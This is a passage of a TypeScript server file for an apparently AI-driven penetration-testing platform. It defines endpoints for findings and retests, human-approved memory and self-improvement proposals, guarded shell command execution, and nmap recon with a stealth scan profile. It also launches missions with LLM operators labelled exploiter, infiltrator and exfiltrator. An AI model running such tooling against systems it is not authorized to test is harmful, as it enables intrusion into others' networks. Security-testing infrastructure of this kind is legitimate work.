    title: typeof body.title === 'string' && body.title.trim() ? redactLedgerText(body.title.trim(), 240) : 'Untitled evidence',
    summary: typeof body.summary === 'string' ? redactLedgerText(body.summary) : '',
    source: ['human', 'agent', 'tool', 'system'].includes(String(body.source)) ? body.source as EvidenceEntry['source'] : 'human',
    uri: typeof body.uri === 'string' ? redactLedgerText(body.uri, 1200) : undefined,
    command: typeof body.command === 'string' ? redactLedgerText(body.command, 1200) : undefined,
    provenanceStrength: normalizeEvidenceProvenanceStrength(body.provenanceStrength, inferEvidenceProvenanceStrength(body)),
    resourceIds: normalizeResourceIds(body.resourceIds),
    createdAt: nowIso(),
  };
  evidenceLedger.set(evidence.id, evidence);
  emitContractEvent('evidence.created', { evidenceId: evidence.id, missionId: evidence.missionId, findingId: evidence.findingId });
  res.status(201).json(redactSecrets(evidence));
});

app.get('/api/findings', (req: Request, res: Response) => {
  const missionId = typeof req.query.missionId === 'string' ? req.query.missionId : '';
  const operationId = typeof req.query.operationId === 'string' ? req.query.operationId : '';
  const family = typeof req.query.family === 'string' ? normalizeMissionFamily(req.query.family, 'web_api') : undefined;
  const status = typeof req.query.status === 'string' ? req.query.status : '';
  const findings = [...findingsLedger.values()]
    .filter(finding => !missionId || finding.missionId === missionId)
    .filter(finding => !operationId || finding.operationId === operationId)
    .filter(finding => !family || finding.family === family)
    .filter(finding => !status || finding.status === status)
    .sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
  res.json(redactSecrets({ findings }));
});

app.post('/api/findings', (req: Request, res: Response) => {
  const body = req.body as Record<string, unknown>;
  if (rejectDuplicateLedgerId(res, findingsLedger, body.id, 'Finding', '/api/findings')) return;
  const now = nowIso();
  const finding: FindingRecord = {
    id: clientLedgerId(body.id, 'finding'),
    missionId: typeof body.missionId === 'string' ? body.missionId : undefined,
    operationId: typeof body.operationId === 'string' ? body.operationId : undefined,
    family: ['web_api', 'ai_red_team', 'cloud_infra', 'smart_contract', 'code_supply_chain', 'crypto_secrets', 'reverse_binary', 'agent_warfare', 'social_osint', 'reporting_remediation'].includes(String(body.family))
      ? body.family as MissionFamily
      : 'web_api',
    title: typeof body.title === 'string' && body.title.trim() ? redactLedgerText(body.title.trim(), 240) : 'Untitled finding',
    target: normalizeTargetValue(body.target),
    claim: typeof body.claim === 'string' && body.claim.trim() ? redactLedgerText(body.claim.trim()) : 'Claim pending evidence review.',
    impact: typeof body.impact === 'string' ? redactLedgerText(body.impact) : '',
    severity: normalizeSeverity(body.severity),
    confidence: clampConfidence(body.confidence),
    status: normalizeFindingStatus(body.status, 'open'),
    evidenceIds: normalizeStringList(body.evidenceIds).filter(id => evidenceLedger.has(id)),
    resourceIds: normalizeResourceIds(body.resourceIds),
    recommendedFix: typeof body.recommendedFix === 'string' ? redactLedgerText(body.recommendedFix) : '',
    acceptanceCriteria: normalizeStringList(body.acceptanceCriteria).map(item => redactLedgerText(item, 500)),
    owner: typeof body.owner === 'string' ? redactLedgerText(body.owner, 240) : undefined,
    createdAt: now,
    updatedAt: now,
    retestIds: [],
  };
  findingsLedger.set(finding.id, finding);
  for (const evidenceId of finding.evidenceIds) {
    const evidence = evidenceLedger.get(evidenceId);
    if (evidence && !evidence.findingId) {
      evidence.findingId = finding.id;
      evidenceLedger.set(evidence.id, evidence);
    }
  }
  emitContractEvent('finding.created', { findingId: finding.id, severity: finding.severity, confidence: finding.confidence });
  res.status(201).json(redactSecrets(finding));
});

app.patch('/api/findings/:id', (req: Request, res: Response) => {
  const existing = findingsLedger.get(req.params.id);
  if (!existing) {
    res.status(404).json({ error: 'Finding not found' });
    return;
  }
  const body = req.body as Record<string, unknown>;
  const updated: FindingRecord = {
    ...existing,
    title: typeof body.title === 'string' && body.title.trim() ? redactLedgerText(body.title.trim(), 240) : existing.title,
    claim: typeof body.claim === 'string' && body.claim.trim() ? redactLedgerText(body.claim.trim()) : existing.claim,
    impact: typeof body.impact === 'string' ? redactLedgerText(body.impact) : existing.impact,
    severity: body.severity === undefined ? existing.severity : normalizeSeverity(body.severity),
    confidence: body.confidence === undefined ? existing.confidence : clampConfidence(body.confidence),
    status: body.status === undefined ? existing.status : normalizeFindingStatus(body.status, existing.status),
    evidenceIds: body.evidenceIds === undefined ? existing.evidenceIds : normalizeStringList(body.evidenceIds).filter(id => evidenceLedger.has(id)),
    resourceIds: body.resourceIds === undefined ? existing.resourceIds : normalizeResourceIds(body.resourceIds),
    recommendedFix: typeof body.recommendedFix === 'string' ? redactLedgerText(body.recommendedFix) : existing.recommendedFix,
    acceptanceCriteria: body.acceptanceCriteria === undefined ? existing.acceptanceCriteria : normalizeStringList(body.acceptanceCriteria).map(item => redactLedgerText(item, 500)),
    owner: typeof body.owner === 'string' ? redactLedgerText(body.owner, 240) : existing.owner,
    updatedAt: nowIso(),
  };
  findingsLedger.set(updated.id, updated);
  emitContractEvent('finding.updated', { findingId: updated.id, status: updated.status });
  res.json(redactSecrets(updated));
});

app.post('/api/findings/:id/retest', (req: Request, res: Response) => {
  const finding = findingsLedger.get(req.params.id);
  if (!finding) {
    res.status(404).json({ error: 'Finding not found' });
    return;
  }
  const body = req.body as Record<string, unknown>;
  if (rejectDuplicateLedgerId(res, retestLedger, body.id, 'Retest', '/api/retests')) return;
  const now = nowIso();
  const retest: RetestRecord = {
    id: clientLedgerId(body.id, 'retest'),
    findingId: finding.id,
    missionId: finding.missionId,
    operationId: finding.operationId,
    status: normalizeRetestStatus(body.status, 'queued'),
    method: typeof body.method === 'string' && body.method.trim() ? redactLedgerText(body.method.trim()) : 'Verify the acceptance criteria and attach fresh evidence.',
    acceptanceCriteria: normalizeStringList(body.acceptanceCriteria).length ? normalizeStringList(body.acceptanceCriteria).map(item => redactLedgerText(item, 500)) : finding.acceptanceCriteria,
    evidenceIds: normalizeStringList(body.evidenceIds).filter(id => evidenceLedger.has(id)),
    resultSummary: typeof body.resultSummary === 'string' ? redactLedgerText(body.resultSummary) : undefined,
    createdAt: now,
    updatedAt: now,
  };
  retestLedger.set(retest.id, retest);
  finding.retestIds.push(retest.id);
  finding.status = retest.status === 'queued' ? 'retest_queued' : finding.status;
  finding.updatedAt = now;
  findingsLedger.set(finding.id, finding);
  emitContractEvent('retest.created', { retestId: retest.id, findingId: finding.id, status: retest.status });
  res.status(201).json(redactSecrets(retest));
});

app.get('/api/retests', (req: Request, res: Response) => {
  const findingId = typeof req.query.findingId === 'string' ? req.query.findingId : '';
  const missionId = typeof req.query.missionId === 'string' ? req.query.missionId : '';
  const operationId = typeof req.query.operationId === 'string' ? req.query.operationId : '';
  const retests = [...retestLedger.values()]
    .filter(retest => !findingId || retest.findingId === findingId)
    .filter(retest => !missionId || retest.missionId === missionId)
    .filter(retest => !operationId || retest.operationId === operationId)
    .sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
  res.json(redactSecrets({ retests }));
});

app.patch('/api/retests/:id', (req: Request, res: Response) => {
  const existing = retestLedger.get(req.params.id);
  if (!existing) {
    res.status(404).json({ error: 'Retest not found' });
    return;
  }
  const body = req.body as Record<string, unknown>;
  const updated: RetestRecord = {
    ...existing,
    status: body.status === undefined ? existing.status : normalizeRetestStatus(body.status, existing.status),
    method: typeof body.method === 'string' && body.method.trim() ? redactLedgerText(body.method.trim()) : existing.method,
    acceptanceCriteria: body.acceptanceCriteria === undefined ? existing.acceptanceCriteria : normalizeStringList(body.acceptanceCriteria).map(item => redactLedgerText(item, 500)),
    evidenceIds: body.evidenceIds === undefined ? existing.evidenceIds : normalizeStringList(body.evidenceIds).filter(id => evidenceLedger.has(id)),
    resultSummary: typeof body.resultSummary === 'string' ? redactLedgerText(body.resultSummary) : existing.resultSummary,
    updatedAt: nowIso(),
  };
  retestLedger.set(updated.id, updated);
  const finding = findingsLedger.get(updated.findingId);
  if (finding) {
    finding.status = updated.status === 'passed' ? 'resolved' : updated.status === 'failed' ? 'validated' : finding.status;
    finding.updatedAt = updated.updatedAt;
    findingsLedger.set(finding.id, finding);
  }
  emitContractEvent('retest.updated', { retestId: updated.id, findingId: updated.findingId, status: updated.status });
  res.json(redactSecrets(updated));
});

app.post('/api/mission-drafts', (req: Request, res: Response) => {
  const now = nowIso();
  const body = req.body as Partial<MissionDraft> & Record<string, unknown>;
  const draft: MissionDraft = {
    id: typeof body.id === 'string' ? body.id : newId('draft'),
    title: typeof body.title === 'string' && body.title.trim() ? body.title.trim() : 'Untitled T3MP3ST Mission',
    objective: typeof body.objective === 'string' && body.objective.trim() ? body.objective.trim() : 'Draft an authorized security mission.',
    scope: normalizeStringList(body.scope),
    constraints: typeof body.constraints === 'string' ? body.constraints : '',
    urgency: ['low', 'normal', 'high', 'critical'].includes(String(body.urgency)) ? body.urgency as MissionDraft['urgency'] : 'normal',
    opsecPreference: ['overt', 'normal', 'covert', 'ghost'].includes(String(body.opsecPreference)) ? body.opsecPreference as MissionDraft['opsecPreference'] : 'normal',
    mode: currentMode(),
    source: ['human', 'agent', 't3mp3st'].includes(String(body.source)) ? body.source as DraftSource : 'human',
    status: 'draft',
    createdAt: now,
    updatedAt: now,
  };
  missionDrafts.set(draft.id, draft);
  emitContractEvent('draft.created', { draftId: draft.id, draft });
  res.status(201).json(draft);
});

app.get('/api/mission-drafts', (_req: Request, res: Response) => {
  res.json({ drafts: [...missionDrafts.values()] });
});

app.get('/api/mission-drafts/:id', (req: Request, res: Response) => {
  const draft = missionDrafts.get(req.params.id);
  if (!draft) {
    res.status(404).json({ error: 'Mission draft not found' });
    return;
  }
  res.json(draft);
});

app.patch('/api/mission-drafts/:id', (req: Request, res: Response) => {
  const existing = missionDrafts.get(req.params.id);
  if (!existing) {
    res.status(404).json({ error: 'Mission draft not found' });
    return;
  }
  const body = req.body as Partial<MissionDraft> & Record<string, unknown>;
  const updated: MissionDraft = {
    ...existing,
    title: typeof body.title === 'string' && body.title.trim() ? body.title.trim() : existing.title,
    objective: typeof body.objective === 'string' && body.objective.trim() ? body.objective.trim() : existing.objective,
    scope: body.scope === undefined ? existing.scope : normalizeStringList(body.scope),
    constraints: typeof body.constraints === 'string' ? body.constraints : existing.constraints,
    urgency: ['low', 'normal', 'high', 'critical'].includes(String(body.urgency)) ? body.urgency as MissionDraft['urgency'] : existing.urgency,
    opsecPreference: ['overt', 'normal', 'covert', 'ghost'].includes(String(body.opsecPreference)) ? body.opsecPreference as MissionDraft['opsecPreference'] : existing.opsecPreference,
    status: ['draft', 'queued', 'launched', 'archived'].includes(String(body.status)) ? body.status as DraftStatus : existing.status,
    updatedAt: nowIso(),
  };
  missionDrafts.set(updated.id, updated);
  emitContractEvent('draft.updated', { draftId: updated.id, draft: updated });
  res.json(updated);
});

app.delete('/api/mission-drafts/:id', (req: Request, res: Response) => {
  const deleted = missionDrafts.delete(req.params.id);
  res.json({ success: deleted });
});

app.post('/api/route-preview', (req: Request, res: Response) => {
  const body = req.body as Partial<MissionDraft> & { draftId?: string };
  const draft = body.draftId ? missionDrafts.get(body.draftId) : undefined;
  const fallbackDraft: MissionDraft = draft || {
    id: newId('draft'),
    title: typeof body.title === 'string' && body.title.trim() ? body.title.trim() : 'T3MP3ST Route Preview',
    objective: typeof body.objective === 'string' && body.objective.trim() ? body.objective.trim() : 'Preview an authorized mission route.',
    scope: normalizeStringList(body.scope),
    constraints: typeof body.constraints === 'string' ? body.constraints : '',
    urgency: ['low', 'normal', 'high', 'critical'].includes(String(body.urgency)) ? body.urgency as MissionDraft['urgency'] : 'normal',
    opsecPreference: ['overt', 'normal', 'covert', 'ghost'].includes(String(body.opsecPreference)) ? body.opsecPreference as MissionDraft['opsecPreference'] : 'normal',
    mode: currentMode(),
    source: ['human', 'agent', 't3mp3st'].includes(String(body.source)) ? body.source as DraftSource : 'human',
    status: 'draft',
    createdAt: nowIso(),
    updatedAt: nowIso(),
  };
  if (!draft) missionDrafts.set(fallbackDraft.id, fallbackDraft);
  const preview = buildRoutePreview(fallbackDraft);
  emitContractEvent('route.previewed', { draftId: preview.draftId, route: preview.route });
  res.json({ ...preview, draftPersisted: true });
});

app.get('/api/routes/:routeId/scorecards', (req: Request, res: Response) => {
  const scorecard = ROUTE_SCORECARDS[req.params.routeId];
  if (!scorecard) {
    res.status(404).json({ error: 'Route scorecard not found', available: Object.keys(ROUTE_SCORECARDS) });
    return;
  }
  res.json({ routeId: req.params.routeId, scorecard });
});

app.post('/api/improvement/proposals', (req: Request, res: Response) => {
  const body = req.body as Partial<ImprovementProposal> & Record<string, unknown>;
  const proposal: ImprovementProposal = {
    id: typeof body.id === 'string' ? body.id : newId('proposal'),
    routeId: typeof body.routeId === 'string' ? body.routeId : 'web_api',
    baseConfigId: typeof body.baseConfigId === 'string' ? body.baseConfigId : 'active',
    status: 'proposed',
    rationale: typeof body.rationale === 'string' ? body.rationale : 'Candidate improvement requires replay validation before promotion.',
    expectedMetrics: typeof body.expectedMetrics === 'object' && body.expectedMetrics !== null ? body.expectedMetrics as Record<string, number> : {},
    risks: normalizeStringList(body.risks),
    requiredReplaySuites: normalizeStringList(body.requiredReplaySuites).length ? normalizeStringList(body.requiredReplaySuites) : ['route-regression-smoke'],
    rollbackTarget: typeof body.rollbackTarget === 'string' ? body.rollbackTarget : 'active',
    createdAt: nowIso(),
  };
  improvementProposals.set(proposal.id, proposal);
  emitContractEvent('improvement.proposed', { proposalId: proposal.id, routeId: proposal.routeId });
  res.status(201).json(proposal);
});

app.get('/api/improvement/proposals', (_req: Request, res: Response) => {
  res.json({ proposals: [...improvementProposals.values()] });
});

app.post('/api/promotion/evaluate', (req: Request, res: Response) => {
  const body = req.body as { proposalId?: string; metrics?: Record<string, number>; approvals?: string[] };
  const proposal = body.proposalId ? improvementProposals.get(body.proposalId) : undefined;
  const metrics = body.metrics || {};
  const approvals = body.approvals || [];
  const replayPassed = metrics.replay_passed === 1;
  const falsePositiveRate = metrics.false_positive_rate ?? 1;
  const routeDelta = metrics.route_delta ?? 0;
  const egressApproved = approvals.includes('egress') || approvals.includes('human');
  const approved = Boolean(proposal && replayPassed && routeDelta > 0 && falsePositiveRate <= 0.08 && egressApproved);
  const decision = {
    approved,
    proposalId: proposal?.id || null,
    gates: {
      proposal_found: Boolean(proposal),
      replay_passed: replayPassed,
      route_delta_positive: routeDelta > 0,
      false_positive_rate_ok: falsePositiveRate <= 0.08,
      egress_approved: egressApproved,
    },
    action: approved ? 'eligible_for_promotion' : 'hold_for_more_evidence',
    rollbackTarget: proposal?.rollbackTarget || null,
  };
  emitContractEvent('promotion.evaluated', { proposalId: proposal?.id || null, approved });
  res.json(decision);
});

app.get('/api/learning/status', (_req: Request, res: Response) => {
  res.json({
    schema_version: 't3mp3st_learning_status/v1',
    policy: {
      silentLearning: false,
      proposalRequired: true,
      acceptanceRequired: true,
      persistence: stateRoot() === 'memory' ? 'ephemeral' : 'filesystem',
      stateRoot: stateRoot(),
      stateFile: stateFilePath(),
      eventsFile: eventsFilePath(),
    },
    counts: {
      memoryEntries: memoryCapsule.size,
      memoryProposals: memoryProposals.size,
      pendingMemoryProposals: [...memoryProposals.values()].filter(proposal => proposal.status === 'pending').length,
      uniqueMemoryFingerprints: new Set([...memoryProposals.values()].map(proposalFingerprint)).size,
      reinforcedMemoryProposals: [...memoryProposals.values()].filter(proposal => (proposal.observationCount || 1) > 1).length,
      improvementProposals: improvementProposals.size,
      missionDrafts: missionDrafts.size,
      evidence: evidenceLedger.size,
      hypotheses: hypothesisLedger.size,
      workOrders: workOrderLedger.size,
      watchCycles: watchCycleLedger.size,
      findings: findingsLedger.size,
      retests: retestLedger.size,
    },
    dedupe: {
      enabled: true,
      strategy: 'type + canonical content fingerprint',
      repeatedReviews: 'increment observationCount; do not create duplicate pending proposals',
    },
    flow: [
      'run produces evidence/finding/retest receipts',
      'POST /api/learning/run-review proposes memory',
      'operator inspects GET /api/memory/proposals',
      'POST /api/memory/proposals/:id/accept promotes one entry',
      'accepted memory appears in GET /api/memory/capsule',
    ],
  });
});

app.post('/api/learning/run-review', (req: Request, res: Response) => {
  const review = buildLearningReview(req.body as Record<string, unknown>);
  res.status(201).json({
    schema_version: 't3mp3st_learning_review/v1',
    ...review,
  });
});

app.get('/api/memory/capsule', (_req: Request, res: Response) => {
  res.json({
    schema_version: 't3mp3st_memory_capsule/v1',
    entries: [...memoryCapsule.values()],
    policy: 'accepted memory only; proposals are separate and inspectable',
  });
});

app.get('/api/memory/proposals', (req: Request, res: Response) => {
  const status = typeof req.query.status === 'string' ? req.query.status : '';
  res.json({
    schema_version: 't3mp3st_memory_proposals/v1',
    proposals: [...memoryProposals.values()]
      .filter(proposal => !status || proposal.status === status)
      .sort((a, b) => b.updatedAt.localeCompare(a.updatedAt)),
  });
});

app.post('/api/memory/proposals', (req: Request, res: Response) => {
  const body = req.body as Partial<MemoryProposal> & Record<string, unknown>;
  if (typeof body.content !== 'string' || !body.content.trim()) {
    res.status(400).json({ error: 'Memory proposal content required' });
    return;
  }
  const proposal = createMemoryProposal(body);
  res.status(201).json(proposal);
});

app.post('/api/memory/proposals/:id/accept', (req: Request, res: Response) => {
  const proposal = memoryProposals.get(req.params.id);
  if (!proposal) {
    res.status(404).json({ error: 'Memory proposal not found' });
    return;
  }
  if (proposal.status === 'rejected') {
    res.status(400).json({ error: 'Rejected proposals cannot be accepted without a new proposal.' });
    return;
  }
  if (proposal.status === 'accepted' && proposal.memoryEntryId) {
    res.json({ proposal, entry: memoryCapsule.get(proposal.memoryEntryId) || null });
    return;
  }

  const now = nowIso();
  const fingerprint = proposalFingerprint(proposal);
  const existingEntry = [...memoryCapsule.values()].find(entry => entryFingerprint(entry) === fingerprint);
  if (existingEntry) {
    existingEntry.fingerprint = fingerprint;
    existingEntry.observationCount = Math.max(existingEntry.observationCount || 1, proposal.observationCount || 1);
    existingEntry.sourceProposalIds = uniqueStrings([...(existingEntry.sourceProposalIds || []), proposal.id]);
    memoryCapsule.set(existingEntry.id, existingEntry);
    proposal.status = 'accepted';
    proposal.acceptedAt = now;
    proposal.memoryEntryId = existingEntry.id;
    proposal.fingerprint = fingerprint;
    proposal.updatedAt = now;
    memoryProposals.set(proposal.id, proposal);
    emitContractEvent('memory.linked_existing', { proposalId: proposal.id, memoryEntryId: existingEntry.id, type: existingEntry.type, fingerprint });
    res.json({ proposal, entry: existingEntry, deduplicated: true });
    return;
  }

  const entry: MemoryEntry = {
    id: newId('mem'),
    type: proposal.type,
    content: proposal.content,
    source: `memory.proposal:${proposal.id}`,
    confidence: proposal.confidence,
    createdAt: now,
    acceptedFrom: proposal.id,
    fingerprint,
    observationCount: proposal.observationCount || 1,
    sourceProposalIds: [proposal.id],
  };
  memoryCapsule.set(entry.id, entry);
  proposal.status = 'accepted';
  proposal.acceptedAt = now;
  proposal.memoryEntryId = entry.id;
  proposal.fingerprint = fingerprint;
  proposal.updatedAt = now;
  memoryProposals.set(proposal.id, proposal);
  emitContractEvent('memory.accepted', { proposalId: proposal.id, memoryEntryId: entry.id, type: entry.type, fingerprint });
  res.json({ proposal, entry });
});

app.post('/api/memory/proposals/:id/reject', (req: Request, res: Response) => {
  const proposal = memoryProposals.get(req.params.id);
  if (!proposal) {
    res.status(404).json({ error: 'Memory proposal not found' });
    return;
  }
  if (proposal.status === 'accepted') {
    res.status(400).json({ error: 'Accepted proposals cannot be rejected; create a corrective proposal instead.' });
    return;
  }
  const now = nowIso();
  proposal.status = 'rejected';
  proposal.rejectedAt = now;
  proposal.updatedAt = now;
  memoryProposals.set(proposal.id, proposal);
  emitContractEvent('memory.rejected', { proposalId: proposal.id, type: proposal.type });
  res.json(proposal);
});

// Read-only OBSIDIVM self-improvement ledger — feeds the Self-Improvement tab's
// evolution timeline + run-complete notification. Reads local disk; returns
// available:false (never errors) when no lineage exists (e.g. a fresh clone).
app.get('/api/selfimprove/ledger', async (_req: Request, res: Response): Promise<void> => {
  const dir = join(process.cwd(), 'bench', 'obsidivm-evolution');
  const readJson = async (name: string): Promise<any> => {
    try { return JSON.parse(await readFile(join(dir, name), 'utf8')); } catch { return null; }
  };
  const readText = async (name: string): Promise<string> => {
    try { return await readFile(join(dir, name), 'utf8'); } catch { return ''; }
  };
  const ledger = await readJson('ledger.json');
  const proposalsLedger = await readJson('proposals-ledger.json');
  const tactics = await readText('current.md');
  const generations = ledger && Array.isArray(ledger.generations) ? ledger.generations : [];
  res.json({
    available: generations.length > 0,
    generations,
    proposalsLedger: proposalsLedger || null,
    tactics,
  });
});

app.get('/api/llm/status', (_req: Request, res: Response) => {
  const llmConfig = config.getLLMConfig();
  res.json({
    connected: !!llm,
    provider: llmConfig.provider,
    model: llmConfig.model,
    hasApiKey: !!llmConfig.apiKey,
    configured: Boolean(llmConfig.apiKey) || providerRunsKeyless(llmConfig.provider),
  });
});

// POST /api/models — live model list for the Universal API Config panel (#90).
// POST (not GET) so the browser can pass its own localStorage-held key/baseUrl in the body — the
// standalone UI holds the key, not the server (consistent with the existing per-request mission key,
// and it stays on localhost). Body values override server config; missing → server config. Runs
// server-side so the browser dodges provider CORS, and fails open to the static AVAILABLE_MODELS list
// (source:'static') so a missing key / network error never leaves the panel empty.
app.post('/api/models', async (req: Request, res: Response): Promise<void> => {
  const body = (req.body ?? {}) as { provider?: string; apiKey?: string; baseUrl?: string };
  const defaultProvider = config.getLLMConfig().provider;
  const requestedProvider = (typeof body.provider === 'string' && body.provider.trim()) || defaultProvider;
  const provider = isKnownLLMProvider(requestedProvider) ? requestedProvider : defaultProvider;
  // getLLMConfig throws for any provider it doesn't switch on (e.g. the legitimate 'local-agent', or a
  // garbage string). A synchronous throw inside this async handler would hang the request (Express 4
  // never responds), so swallow it and fall through to the static list — the route must always answer.
  let cfg: { baseUrl?: string; apiKey?: string } = {};
  try { cfg = config.getLLMConfig(provider); } catch { /* provider has no remote/server config → static fallback */ }
  const bodyBaseUrl = typeof body.baseUrl === 'string' && body.baseUrl.trim() ? body.baseUrl : undefined;
  const bodyKey = typeof body.apiKey === 'string' && body.apiKey ? body.apiKey : undefined;
  // Bind key+baseUrl by source: a caller-supplied custom baseUrl must bring its OWN key — never lend
  // the server's configured apiKey to a body-chosen URL (that would disclose the stored key). The
  // server key is only ever sent to the server's own configured provider endpoint.
  const baseUrl = bodyBaseUrl ?? cfg.baseUrl;
  const apiKey = bodyBaseUrl ? bodyKey : (bodyKey ?? cfg.apiKey);
  const staticFallback = AVAILABLE_MODELS[provider].map((m: { id: string }) => ({ id: m.id }));
  const resolved = await resolveModels(provider, { baseUrl, apiKey, staticFallback });
  res.json({ provider, ...resolved });
});

// =============================================================================
// TOOL EXECUTION ENDPOINTS
// =============================================================================

app.post('/api/tools/execute', async (req: Request, res: Response): Promise<void> => {
  const body = req.body as Record<string, unknown>;
  const command = typeof body.command === 'string' ? body.command : '';
  const timeout = typeof body.timeout === 'number' ? body.timeout : 30000;
  if (!command) { res.status(400).json({ error: 'Command required' }); return; }
  const parsed = parseCommand(command);
  if ('error' in parsed) { res.status(400).json({ error: parsed.error }); return; }
  const targetResolution = resolveCommandExecutionTarget(body, parsed);
  if ('error' in targetResolution) { res.status(400).json({ error: targetResolution.error }); return; }
  const guard = guardAction(body, 'command_execution', targetResolution.target, `Run ${parsed.bin} against ${targetResolution.target}`);
  if (!guard.allowed) { blockForApproval(res, guard); return; }
  const result = await executeCommand(command, timeout);
  res.json(result);
});

app.post('/api/tools/recon', async (req: Request, res: Response): Promise<void> => {
  const body = req.body as Record<string, unknown>;
  const target = normalizeTargetValue(body.target);
  const scan_type = typeof body.scan_type === 'string' ? body.scan_type : 'quick';
  if (!target) { res.status(400).json({ error: 'Target required' }); return; }
  const targetHost = hostFromTarget(target);
  if (!/^[a-z0-9._:-]+$/i.test(targetHost)) {
    res.status(400).json({ error: 'Target contains unsupported characters' });
    return;
  }
  const guard = guardAction(body, 'network_request', targetHost, `Recon scan against ${targetHost}`);
  if (!guard.allowed) { blockForApproval(res, guard); return; }

  const portArgs: Record<string, string> = { quick: '-F', standard: '--top-ports 1000', full: '-p-', stealth: '--top-ports 100 -T1' };
  const [dns, ports] = await Promise.all([
    executeCommand(`dig +short ${targetHost}`),
    executeCommand(`nmap ${portArgs[scan_type] || '-F'} --open ${targetHost}`, 120000)
  ]);

  res.json({ success: true, target: targetHost, scan_type, approvalId: guard.approval?.id || null, results: { dns, ports } });
});

app.get('/api/tools', (_req: Request, res: Response) => {
  res.json({
    success: true,
    tools: SAFE_COMMANDS,
    count: SAFE_COMMANDS.length,
    catalog: {
      ...summarizeToolCatalog(),
      frontierMilestone: FRONTIER_ARSENAL_MILESTONE,
      adapterCoverage: Math.min(100, Math.round((TOOL_ADAPTERS.length / FRONTIER_ARSENAL_MILESTONE) * 100)),
    },
    endpoints: {
      catalog: '/api/arsenal/catalog',
      status: '/api/arsenal/status',
      plan: '/api/arsenal/plan',
      activation: '/api/arsenal/activation',
    },
  });
});

app.post('/api/llm/chat', async (req: Request, res: Response): Promise<void> => {
  // Caller-supplied systemPrompt is a local-operator convenience (the UI uses it);
  // safe here because the cross-origin CSRF guard above blocks foreign-webpage drive-by.
  const { message, systemPrompt } = req.body;
  if (!message) { res.status(400).json({ error: 'Message required' }); return; }
  if (!llm) { res.status(503).json({ error: 'LLM not configured' }); return; }
  try {
    const response = await llm.prompt(message, systemPrompt);
    res.json({ success: true, response });
  } catch { res.status(500).json({ error: 'LLM request failed' }); }
});

// =============================================================================
// MISSION DISPATCH & OPERATOR MANAGEMENT ENDPOINTS
// =============================================================================

/**
 * POST /api/mission/start — Start a mission with real backend operators
 *
 * Body: { name, targets: [{ host, scope?, ports? }], operators: string[],
 *         apiKey, provider?, model?, opsecLevel? }
 */
app.post('/api/mission/start', async (req: Request, res: Response): Promise<void> => {
  const {
    name = 'Operation ' + Date.now(),
    targets = [],
    operators = [],
    apiKey,
    provider,
    model,
    // OPTIONAL white-box source: an absolute path to a LOCAL repo you own. When
    // present, we ingest + security-rank it and hand the packed source to the
    // command via setWhiteboxSource BEFORE start(), so operators reason over the
    // real source instead of black-box probing. Absent = unchanged behavior.
    repoPath,
  } = req.body;

  // Use the request-selected backend, or fall back to the server's configured default.
  // Local/local-agent backends need no hosted API key.
  // SECURITY NOTE: apiKey is read from the request body (Authorization header is
  // preferred). Kept body-accepted for the same-origin UI; only reachable from
  // the local operator (loopback bind + origin guard). Header move is out of scope.
  const missionLLMConfig = resolveGeneralLLMConfig(provider, model, apiKey);
  const effectiveKey = missionLLMConfig.apiKey;
  if (providerNeedsApiKey(missionLLMConfig.provider) && !effectiveKey) {
    res.status(400).json({ error: 'API key required — pass apiKey, configure one on the server, or connect a local agent (Claude Code / Codex / Hermes)' });
    return;
  }
  if (missionLLMConfig.provider === 'local-agent') {
    const localAgent = await requireLiveLocalAgent(missionLLMConfig.model);
    if (!localAgent.ok) {
      res.status(503).json({ error: localAgent.error });
      return;
    }
  }

  if (targets.length === 0) {
    res.status(400).json({ error: 'At least one target required' });
    return;
  }

  for (const target of targets) {
    const targetValue = normalizeTargetValue(target);
    const guard = guardAction(req.body as Record<string, unknown>, 'mission_execution', targetValue, `Start mission ${name} against ${targetValue}`);
    if (!guard.allowed) { blockForApproval(res, guard); return; }
  }

  let repoSource: ReturnType<typeof resolveRepoSourceForAnalysis> | undefined;
  if (typeof repoPath === 'string' && repoPath.trim()) {
    try {
      repoSource = resolveRepoSourceForAnalysis(repoPath);
    } catch (e) {
      if (e instanceof RepoPathError) { res.status(400).json({ error: `repoPath rejected: ${e.message}` }); return; }
      if (e instanceof RepoCloneError) { res.status(400).json({ error: e.message }); return; }
      console.error('[T3MP3ST] repo source validation error:', e);
      res.status(500).json({ error: 'repo source validation failed' });
      return;
    }
  }

  try {
    const cmd = createTempestCommandInstance(name, effectiveKey, missionLLMConfig.provider, missionLLMConfig.model);

    // Add targets
    for (const t of targets) {
      const host: string = t.host || t;
      if (host.startsWith('http://') || host.startsWith('https://')) {
        cmd.targetEnv.addTarget(createTargetFromUrl(host));
      } else if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(host)) {
        cmd.targetEnv.addTarget(createTargetFromIP(host));
      } else {
        cmd.targetEnv.addTarget(createTargetFromUrl(`http://${host}`));
      }
    }

    // Spawn operators
    const spawnedOps: Array<{ id: string; callsign: string; archetype: string }> = [];
    const validArchetypes: OperatorArchetype[] = ['recon', 'scanner', 'exploiter', 'infiltrator', 'exfiltrator', 'ghost', 'coordinator', 'analyst'];

    for (const opId of operators) {
      const archetype = opId as OperatorArchetype;
      if (validArchetypes.includes(archetype)) {
        const callsign = archetype.charAt(0).toUpperCase() + archetype.slice(1) + '-1';
        try {
          const op = cmd.spawnOperator(callsign, archetype);
          spawnedOps.push({ id: op.id, callsign: op.callsign, archetype });
        } catch (e: any) {
          // Duplicate callsign — skip
          console.warn(`[T3MP3ST] Skipping duplicate operator: ${callsign}`);
        }
      }
    }

    // White-box wiring (OPTIONAL): if the caller passed a LOCAL repo path that
    // exists on disk, ingest + security-rank it and feed the packed source into
    // the command before it starts, so operators analyze real source you own
    // rather than probing a black box. Reads LOCAL disk only — no network target.
    let whitebox: { includedUnits: number; droppedUnits: number; stats: unknown; source: 'local' | 'github' } | undefined;
    if (repoSource) {
      const wb = ingestRepoToSourceContext(repoSource.repoPath);
      // Only feed a NON-empty source (0 ingestable units → don't overwrite the operators'
      // black-box view with an empty blob; the includedUnits:0 in the response signals it).
      if (wb.sourceContext.trim()) cmd.setWhiteboxSource(wb.sourceContext);
      whitebox = { includedUnits: wb.includedUnits, droppedUnits: wb.droppedUnits, stats: wb.stats, source: repoSource.source };
    }

    // Start the command loop (auto-creates mission, auto-dispatches tasks)
    cmd.start();

    broadcastEvent('mission:started', {
      name,
      targets: targets.map((t: any) => t.host || t),
      operators: spawnedOps,
      timestamp: Date.now(),
    });

    res.json({
      success: true,
